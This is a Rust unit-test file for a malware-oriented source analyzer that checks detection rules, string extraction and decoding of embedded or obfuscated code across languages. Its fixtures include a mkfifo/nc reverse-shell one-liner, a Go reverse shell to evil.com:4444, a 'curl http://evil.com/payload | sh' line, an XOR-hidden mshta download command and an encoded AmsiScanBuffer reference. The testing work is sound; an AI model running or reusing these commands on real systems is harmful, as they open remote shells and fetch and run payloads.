use super::*;

fn quoted_origin_probe_engine() -> crate::Engine {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("traits.yaml");
    std::fs::write(
        &path,
        r#"
defaults:
  for: [shell]
  platforms: [unix, windows]
traits:
  - id: test/source::origin-probe
    desc: Origin scope regression probe
    crit: notable
    if:
      type: text
      substr: mkfifo
    unless:
      - id: metadata/lang/source/origin::heuristic-quoted-source
"#,
    )
    .unwrap();
    crate::Engine::from_rules(Arc::new(
        crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap(),
    ))
}

#[test]
fn heuristic_quoted_origin_is_explicit_before_rules_not_derived_from_filename() {
    let code = "mkfifo /tmp/f\n";
    let engine = quoted_origin_probe_engine();
    for path in ["actual.sh", "actual.sh##plain@0x0"] {
        let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
            .unwrap()
            .with_engine(engine.clone())
            .analyze_source_as_configured(Path::new(path), code);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "test/source::origin-probe")
        );
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.id
                    == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID)
        );
    }
    let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
        .unwrap()
        .with_engine(engine)
        .with_heuristic_quoted_context()
        .analyze_source_as_configured(Path::new("carrier.py##plain@0x20"), code);
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "test/source::origin-probe")
    );
    assert!(report.findings.iter().any(|f| f.id
        == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID
        && f.crit == crate::Criticality::Baseline));
}

#[test]
fn encoded_context_clears_heuristic_quoted_origin() {
    let engine = quoted_origin_probe_engine();
    let code = "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f'";
    let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
        .unwrap()
        .with_engine(engine)
        .with_heuristic_quoted_context()
        .with_encoded_context(vec!["base32".into()])
        .analyze_source_as_configured(Path::new("carrier.py##base32@0x20"), code);
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "test/source::origin-probe")
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID)
    );
}

#[test]
fn groovy_single_quoted_commands_reach_literal_rules() {
    let dir = tempfile::tempdir().unwrap();
    let traits = dir.path().join("traits.yaml");
    std::fs::write(
        &traits,
        r#"
defaults:
  for: [groovy]
traits:
  - id: "test/groovy::command"
    desc: "Groovy command literal"
    crit: notable
    if:
      type: string_literal
      exact: "hostname -f"
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&traits).unwrap();
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Groovy)
        .unwrap()
        .with_engine(crate::Engine::from_rules(std::sync::Arc::new(mapper)));
    for code in ["String command = 'hostname -f'", "run('hostname -f')"] {
        let report = analyzer.analyze_source(Path::new("command.groovy"), code);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.id == "test/groovy::command")
        );
        let literal = report
            .strings
            .iter()
            .find(|s| &*s.value == "hostname -f" && s.section.as_deref() == Some("ast"))
            .unwrap();
        assert_eq!(literal.offset, Some(code.find("hostname").unwrap() as u64));
    }
    let report = analyzer.analyze_source(
        Path::new("comment.groovy"),
        "// run('hostname -f')\nString command = 'echo hostname -f'",
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "test/groovy::command")
    );
    let report = analyzer.analyze_source(Path::new("escaped.groovy"), r"String s = 'line\nnext'");
    assert!(
        report
            .strings
            .iter()
            .any(|s| { &*s.value == "line\nnext" && s.section.as_deref() == Some("ast") })
    );
}

/// An AST leg is located by `row:col`, a text leg by a byte offset.
/// Both are positions in one file, so a `scope: leaf` rule needing both
/// must fire -- each of the two once landed in a scope of its own.
#[test]
fn leaf_scope_joins_ast_and_text_legs_in_one_file() {
    let dir = tempfile::tempdir().unwrap();
    let traits = dir.path().join("traits.yaml");
    std::fs::write(
        &traits,
        r#"
defaults:
  for: [python]
traits:
  - id: "test/leaf::split-loop"
    desc: "Loops over a split string"
    crit: notable
    if:
      type: tree-sitter
      query: |
        (for_statement
          right: (call function: (attribute attribute: (identifier) @split))
          (#eq? @split "split"))
  - id: "test/leaf::network-pack"
    desc: "Packs network-order fields"
    crit: notable
    if:
      type: text
      regex: struct\.pack\(\s*'!H+'
composite_rules:
  - id: "test/leaf::leaf-rule"
    desc: "Both legs in one unit"
    crit: suspicious
    scope: leaf
    all:
      - id: test/leaf::split-loop
    any:
      - id: test/leaf::network-pack
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&traits).unwrap();
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
        .unwrap()
        .with_engine(crate::Engine::from_rules(std::sync::Arc::new(mapper)));
    let code = "import struct\n\ndef encode_name(value):\n    wire = b''\n    for piece in value.split('.'):\n        wire += bytes([len(piece)]) + piece.encode('ascii')\n    return wire + b'\\x00'\n\npacket = struct.pack('!HHHHHH', 1, 256, 1, 0, 0, 0)\n";
    let report = analyzer.analyze_source(Path::new("dns.py"), code);

    let ids: Vec<&str> = report.findings.iter().map(|f| f.id.as_str()).collect();
    assert!(ids.contains(&"test/leaf::split-loop"), "{ids:?}");
    assert!(ids.contains(&"test/leaf::network-pack"), "{ids:?}");
    assert!(ids.contains(&"test/leaf::leaf-rule"), "{ids:?}");
}

#[test]
fn source_retains_predecoded_base32_and_base85_evidence() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    for (method, encoding) in [
        (stng::StringMethod::Base32Decode, "base32"),
        (stng::StringMethod::Base85Decode, "base85"),
    ] {
        let extracted =
            stng::ExtractedString::new("harmless decoded evidence", 12, method).with_data_len(40);
        let report = analyzer.analyze_source_impl(
            Path::new("sample.js"),
            "const data = 'recorded decoder input';",
            &[extracted],
            &[],
            None,
            false,
            None,
            None,
            None,
        );
        assert!(
            report.strings.iter().any(|s| {
                &*s.value == "harmless decoded evidence"
                    && s.encoding_chain == [encoding]
                    && s.offset == Some(12)
                    && s.section.as_deref() == Some("decoded")
            }),
            "lost {encoding} evidence"
        );
    }
}

#[test]
fn source_string_budget_counts_unique_retained_bytes() {
    let mut report = AnalysisReport::new(TargetInfo::default());
    let mut seen = SeenStrings::default();
    let literal = StringInfo {
        value: "abc".into(),
        offset: Some(1),
        section: Some("ast".to_string()),
        string_type: None,
        encoding: "utf-8".to_string(),
        encoding_chain: Vec::new(),
        fragments: None,
    };
    push_unique_string(&mut report, &mut seen, literal.clone());
    push_unique_string(&mut report, &mut seen, literal.clone());
    assert_eq!(seen.bytes, 3);
    assert_eq!(report.strings.len(), 1);
    seen.bytes = crate::strings::MAX_TOTAL_STRING_BYTES - 3;
    let mut next = literal.clone();
    next.offset = Some(10);
    push_unique_string(&mut report, &mut seen, next);
    assert_eq!(seen.bytes, crate::strings::MAX_TOTAL_STRING_BYTES);
    assert_eq!(report.strings.len(), 2);
    let mut extra = literal;
    extra.offset = Some(20);
    push_unique_string(&mut report, &mut seen, extra);
    assert_eq!(report.strings.len(), 2);
    assert!(seen.truncated);
}

#[test]
fn source_string_budget_enforces_count_and_oversized_literal_limits() {
    let mut seen = SeenStrings::default();
    assert!(!seen.has_room(crate::strings::MAX_TOTAL_STRING_BYTES + 1));
    assert!(seen.truncated);
    assert!(seen.has_room(1)); // Smaller later literals remain observable.
    seen.keys = (0..crate::strings::MAX_STRINGS_PER_FILE)
        .map(|n| (u64::try_from(n).unwrap(), 0, 0, 0))
        .collect();
    assert!(!seen.has_room(1));
}
use crate::analyzers::FileType;
use std::path::PathBuf;
use tempfile::NamedTempFile;

#[test]
fn test_python_analysis() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
    let path = PathBuf::from("test.py");
    let code = r#"
import os

def main():
    os.system("echo hello")
    print("world")

if __name__ == "__main__":
    main()
"#;
    let report = analyzer.analyze_source(&path, code);
    assert!(!report.functions.is_empty());
    assert!(!report.strings.is_empty());
}

/// A string literal's recorded offset must point at the first byte of its
/// (quote-stripped) value, not at the opening quote. Otherwise a downstream
/// span of `[offset, value.len()]` is shifted one byte left and highlights
/// `"gzi` instead of `gzip` (regression: lab.atomdrift.org off-by-one).
#[test]
fn test_string_literal_offset_excludes_quote() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    let path = PathBuf::from("test.js");
    let code = r#"const algorithm = "gzip";"#;
    let report = analyzer.analyze_source(&path, code);

    let s = report
        .strings
        .iter()
        .find(|s| &*s.value == "gzip")
        .expect("expected a 'gzip' string literal");
    let off = s.offset.expect("string literal should record an offset") as usize;
    let span = &code.as_bytes()[off..off + s.value.len()];
    assert_eq!(
        span,
        b"gzip",
        "offset {off} + len {} spans {:?}, expected b\"gzip\"",
        s.value.len(),
        String::from_utf8_lossy(span),
    );
}

#[test]
fn python_docstrings_are_separated_from_executable_literals() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
    let path = PathBuf::from("docstrings.py");
    let code = r##"
"""References https://example.org/documentation."""

def fetch():
    """References http://example.net/calendar-source."""
    return "http://runtime.example/payload"

class Calendar:
    """References http://example.edu/calendar-source."""

def call_first():
    print("http://runtime.example/first-call")
"##;
    let report = analyzer.analyze_source(&path, code);

    let doc_urls: Vec<_> = report
        .strings
        .iter()
        .filter(|s| s.value.contains("http") && s.section.as_deref() == Some("ast-docstring"))
        .map(|s| &*s.value)
        .collect();
    assert_eq!(
        doc_urls.len(),
        3,
        "module, function, and class docstrings: {doc_urls:?}"
    );
    assert!(
        report
            .strings
            .iter()
            .any(|s| s.value == "http://runtime.example/payload"
                && s.section.as_deref() == Some("ast"))
            && report.strings.iter().any(|s| {
                s.value == "http://runtime.example/first-call"
                    && s.section.as_deref() == Some("ast")
            }),
        "assigned and call-argument URLs remain ordinary AST literals"
    );
}

#[test]
fn test_javascript_analysis() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    let path = PathBuf::from("test.js");
    let code = r#"
const http = require('http');

function fetchData(url) {
    return http.get(url);
}

const handler = async () => {
    await fetchData("http://example.com");
};
"#;
    let report = analyzer.analyze_source(&path, code);
    assert!(!report.functions.is_empty());
}

#[test]
fn one_walk_collects_functions_strings_and_call_imports() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    let path = PathBuf::from("one-walk.js");
    let code = r#"
function fetchData(url) {
    return eval(url);
}
const algorithm = "gzip";
"#;
    let report = analyzer.analyze_source(&path, code);
    assert!(
        report.functions.iter().any(|f| f.name == "fetchData"),
        "function walk must still see fetchData: {:?}",
        report.functions.iter().map(|f| &f.name).collect::<Vec<_>>()
    );
    assert!(
        report.strings.iter().any(|s| &*s.value == "gzip"),
        "string walk must still see gzip"
    );
    assert!(
        report.imports.iter().any(|i| i.symbol == "eval"),
        "call walk must still record eval: {:?}",
        report.imports.iter().map(|i| &i.symbol).collect::<Vec<_>>()
    );
}

#[test]
fn ast_string_literals_dedup_string_and_fragment() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    let path = PathBuf::from("dedup.js");
    let report = analyzer.analyze_source(&path, r#"const algorithm = "gzip";"#);
    let gzip = report
        .strings
        .iter()
        .filter(|s| &*s.value == "gzip" && s.section.as_deref() == Some("ast"))
        .count();
    assert_eq!(
        gzip, 1,
        "string + string_fragment must not double-count gzip"
    );
}

#[test]
fn ast_string_literals_keep_distinct_offsets() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
    let path = PathBuf::from("many-strings.js");
    let mut code = String::from("const o = {\n");
    for i in 0..500 {
        code.push_str(&format!("  k{i}: \"v{i}\",\n"));
    }
    code.push_str("};\n");
    let report = analyzer.analyze_source(&path, &code);
    let ast = report
        .strings
        .iter()
        .filter(|s| s.section.as_deref() == Some("ast"))
        .count();
    assert_eq!(ast, 500, "each quoted literal stays unique: {ast}");
}

#[test]
fn test_go_analysis() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go).unwrap();
    let path = PathBuf::from("test.go");
    let code = r#"
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
"#;
    let report = analyzer.analyze_source(&path, code);
    assert!(!report.functions.is_empty());
}

#[test]
fn test_all_languages_have_configs() {
    // Ensure all source code file types have configurations
    let types = vec![
        FileType::Python,
        FileType::JavaScript,
        FileType::TypeScript,
        FileType::Go,
        FileType::Rust,
        FileType::Ruby,
        FileType::Php,
        FileType::Shell,
        FileType::Lua,
        FileType::Perl,
        FileType::PowerShell,
        FileType::Java,
        FileType::CSharp,
        FileType::C,
        FileType::Swift,
        FileType::ObjectiveC,
        FileType::Groovy,
        FileType::Scala,
        FileType::Zig,
        FileType::Elixir,
    ];

    for ft in types {
        assert!(
            config_for_file_type(&ft).is_some(),
            "Missing config for {:?}",
            ft
        );
    }
}

// Go-specific capability detection tests
// These verify the unified analyzer correctly detects Go capabilities via the trait system

fn go_test_mapper() -> crate::capabilities::CapabilityMapper {
    let yaml = r#"
defaults:
  platforms: [linux, macos, windows, unix, android, ios, appliance, routeros, fortios]
  for: [go]
traits:
  - id: micro-behaviors/process/create/direct::exec-command
    desc: Executes commands via Go os/exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: exec.Command

  - id: micro-behaviors/process/create/direct::syscall-exec
    desc: Executes commands via Go syscall.Exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: syscall.Exec

  - id: micro-behaviors/communications/socket/connect::dial
    desc: Go net.Dial call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Dial

  - id: micro-behaviors/communications/socket/listen::listen-go
    desc: Go net.Listen call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Listen

  - id: micro-behaviors/communications/http/get::http-get
    desc: Go http.Get call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.Get

  - id: micro-behaviors/communications/http/server::listenandserve-call
    desc: Go http.ListenAndServe call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.ListenAndServe

  - id: micro-behaviors/crypto/library::aes-new-cipher
    desc: Go AES cipher construction
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: aes.NewCipher

  - id: micro-behaviors/crypto/library::rsa-generate-key
    desc: Go RSA key generation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: rsa.GenerateKey

  - id: micro-behaviors/fs/file/operations::os-create
    desc: Go file creation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: os.Create
"#;

    let mut file = NamedTempFile::new().expect("create temp yaml");
    std::io::Write::write_all(&mut file, yaml.as_bytes()).expect("write temp yaml");
    crate::capabilities::CapabilityMapper::from_yaml_with_options(
        file.path(),
        crate::LoadOptions::default(),
    )
    .expect("load test-local go mapper")
}

fn analyze_go_code(code: &str) -> crate::types::AnalysisReport {
    let mapper = go_test_mapper();
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go)
        .unwrap()
        .with_capability_mapper(mapper);
    let path = PathBuf::from("test.go");
    analyzer.analyze_source(&path, code)
}

#[test]
fn test_detect_exec_command() {
    let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
        "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_syscall_exec() {
    let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/process/create/direct::syscall-exec"),
        "Expected micro-behaviors/process/create/direct::syscall-exec, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_reverse_shell() {
    let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
        "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
        "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_net_listen() {
    let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/communications/socket/listen::listen-go"),
        "Expected micro-behaviors/communications/socket/listen::listen-go, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_net_dial() {
    let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
        "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_http_get() {
    let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
        "Expected micro-behaviors/communications/http/get::http-get, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_http_server() {
    let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
    let report = analyze_go_code(code);
    // The ListenAndServe call should be detected as a dedicated trait
    assert!(
        report.findings.iter().any(|c| c.id
            == "micro-behaviors/communications/http/server::go-http-server"
            || c.id == "micro-behaviors/communications/http/server::listenandserve-call"),
        "Expected go-http-server or listenandserve-call, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_aes_encryption() {
    let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report.findings.iter().any(|c| {
            c.id == "micro-behaviors/crypto/library::aes-new-cipher"
                || c.id == "micro-behaviors/crypto/library/signals::aes-new-cipher"
        }),
        "Expected micro-behaviors/crypto/library::aes-new-cipher or micro-behaviors/crypto/library/signals::aes-new-cipher, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_rsa_encryption() {
    let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report.findings.iter().any(|c| {
            c.id == "micro-behaviors/crypto/library::rsa-generate-key"
                || c.id == "micro-behaviors/crypto/library/signals::rsa-generate-key"
        }),
        "Expected micro-behaviors/crypto/library::rsa-generate-key or micro-behaviors/crypto/library/signals::rsa-generate-key, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_detect_file_write() {
    let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/fs/file/operations::os-create"),
        "Expected micro-behaviors/fs/file/operations::os-create, found: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_go_extract_functions() {
    let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
    let report = analyze_go_code(code);
    assert!(report.functions.len() >= 2);
    assert!(report.functions.iter().any(|f| f.name == "hello"));
    assert!(report.functions.iter().any(|f| f.name == "main"));
}

#[test]
fn test_go_multiple_capabilities() {
    let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
    let report = analyze_go_code(code);
    assert!(
        report.findings.len() >= 2,
        "Expected >= 2 findings, found: {}",
        report.findings.len()
    );
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
        "Expected micro-behaviors/process/create/direct::exec-command"
    );
    assert!(
        report
            .findings
            .iter()
            .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
        "Expected micro-behaviors/communications/http/get::http-get"
    );
}

/// Regression test for rayon deadlock when embedded code detection
/// triggers recursive `analyze_source_impl` from within a saturated
/// rayon thread pool. Before the fix, the inner `rayon::in_place_scope`
/// would wait forever for a free thread that could never appear.
#[test]
fn test_embedded_code_no_deadlock_under_rayon_pressure() {
    use rayon::prelude::*;
    use std::sync::mpsc;

    // Python code large enough to trigger embedded code detection
    // (> MIN_PLAIN_SIZE=50 bytes, with multiple language indicators)
    let embedded_python = r#"import os
import sys
def exploit():
    os.system('curl http://evil.com/payload | sh')
    sys.exit(0)
exploit()"#;

    // A shell script that contains the embedded Python as a string
    let shell_script = format!(
        "#!/bin/bash\necho '{}'\ncurl http://example.com\n",
        embedded_python
    );

    // Use a small thread pool to make deadlock more likely
    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(2)
        .build()
        .unwrap();

    let (tx, rx) = mpsc::channel();

    pool.spawn(move || {
        // Saturate both threads with par_iter, each analyzing a script
        // that may trigger embedded code detection → recursive analysis
        let items: Vec<_> = (0..4).collect();
        items.par_iter().for_each(|i| {
            #[allow(clippy::expect_used)]
            let analyzer =
                UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).expect("shell analyzer");
            let path = PathBuf::from(format!("test_{}.sh", i));
            let _report = analyzer.analyze_source(&path, &shell_script);
        });
        let _ = tx.send(());
    });

    // If the deadlock is present, this will hang forever.
    // 30 seconds is very generous — normal completion is <1s.
    let result = rx.recv_timeout(std::time::Duration::from_secs(30));
    assert!(
        result.is_ok(),
        "Timed out — likely deadlock in embedded code detection under rayon pressure"
    );
}
#[test]
fn lua_literal_corpus_uses_decimal_escapes_and_preserves_raw_strings() {
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Lua).unwrap();
    let source = r#"local lib = require("\102\102\105")
local name = "\065\109\115\105\083\099\097\110\066\117\102\102\101\114"
local raw = [[\065]]
"#;
    let report = analyzer.analyze_source(Path::new("loader.lua"), source);
    assert!(report.strings.iter().any(|s| s.value.as_ref() == "ffi"));
    assert!(
        report
            .strings
            .iter()
            .any(|s| s.value.as_ref() == "AmsiScanBuffer")
    );
    assert!(report.strings.iter().any(|s| s.value.as_ref() == r"\065"));
    assert!(
        !report
            .strings
            .iter()
            .any(|s| { s.section.as_deref() == Some("ast") && s.value.as_ref() == "A" })
    );
}

/// The hex/XOR fixture `unpack::js_xor_command` recovers: an `mshta` command
/// line run through `child_process.exec`.
const XOR_COMMAND: &str = "mshta https://program.fixturetests.net/control.hta";
fn xor_loop_source(key: u8) -> String {
    let blob = hex::encode(XOR_COMMAND.bytes().map(|b| b ^ key).collect::<Vec<_>>());
    format!(
        "const cp=require('child_process');\nconst BLOB='{blob}'; const KEY={key};\nfunction f(){{const raw=Buffer.from(BLOB,'hex');const plain=Buffer.alloc(raw.length);for(let i=0;i<raw.length;i++){{plain[i]=raw[i]^KEY;}}(0,cp.exec)(plain.toString('utf8'),{{windowsHide:true}},()=>{{}});}}"
    )
}

#[test]
fn js_xor_command_yields_a_batch_layer_with_source_facts() {
    let source = xor_loop_source(57);
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript)
        .unwrap()
        .with_engine(crate::Engine::empty());
    let report = analyzer.analyze_source(std::path::Path::new("input.js"), &source);
    let sha = crate::analyzers::utils::calculate_sha256(XOR_COMMAND.as_bytes());
    let child = report
        .files
        .iter()
        .find(|f| f.sha256 == sha)
        .expect("decoded command");
    assert_eq!(child.file_type, "batch");
    assert_eq!(
        child.encoding.as_deref(),
        Some(["hex".into(), "xor".into()].as_slice())
    );
    let view = child.filefacts.as_ref().unwrap();
    assert_eq!(
        view.values.pointer("/source/batch/command_sites/0/text"),
        Some(&XOR_COMMAND.into())
    );
}

const PY_PAYLOAD: &str = "OBZGS3TUMYQCOJLTLRXCOIBHNBQXE3LMMVZXGIDEMVRW6ZDFOIQGG33OORZG63BAN5XGY6JH";
const PY_COMMAND: &str = "printf '%s\\n' 'harmless decoder control only'";
fn python_b32_fixture() -> String {
    format!(
        "import base64\nimport subprocess\nDATA = '{PY_PAYLOAD}'\ndef helper():\n    entry = base64.b32decode(DATA + '=' * (-len(DATA) % 8))\n    subprocess.run(['/bin/sh', '-c', entry.decode()], capture_output=True, timeout=15)\n"
    )
}

#[test]
fn python_encoded_command_yields_a_shell_layer_with_exact_hash() {
    let source = python_b32_fixture();
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
        .unwrap()
        .with_engine(crate::Engine::empty());
    let report = analyzer.analyze_source(std::path::Path::new("bound.py"), &source);
    let expected = crate::analyzers::utils::calculate_sha256(PY_COMMAND.as_bytes());
    let child = report
        .files
        .iter()
        .find(|f| f.sha256 == expected)
        .expect("decoded command layer");
    assert_eq!(child.file_type, "shell");
    assert_eq!(
        child.encoding.as_deref(),
        Some(["base32".to_owned()].as_slice())
    );
    assert!(child.path.contains(&format!(
        "@{}",
        source.find(&format!("'{PY_PAYLOAD}'")).unwrap()
    )));
}

/// filefacts locates an Edge.js C# body (`source.embedded`); cleave analyzes
/// it as a C# view beside the JavaScript host.
#[test]
fn edge_js_csharp_body_becomes_a_csharp_view() {
    let csharp = "using System; using System.Threading.Tasks; class Startup { public async Task<object> Invoke(object input) { return input; } }";
    let source = format!(
        "const bridge=require('edge-js'); const compiled=bridge.func(function(){{/*{csharp}*/}});"
    );
    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript)
        .unwrap()
        .with_engine(crate::Engine::empty());
    let report = analyzer.analyze_source(std::path::Path::new("bridge.js"), &source);
    let offset = source.find(csharp).unwrap();
    let view = report
        .files
        .iter()
        .find(|f| f.path.ends_with(&format!("##csharp@{offset}")))
        .expect("C# view");
    assert_eq!(view.file_type, "csharp");
}
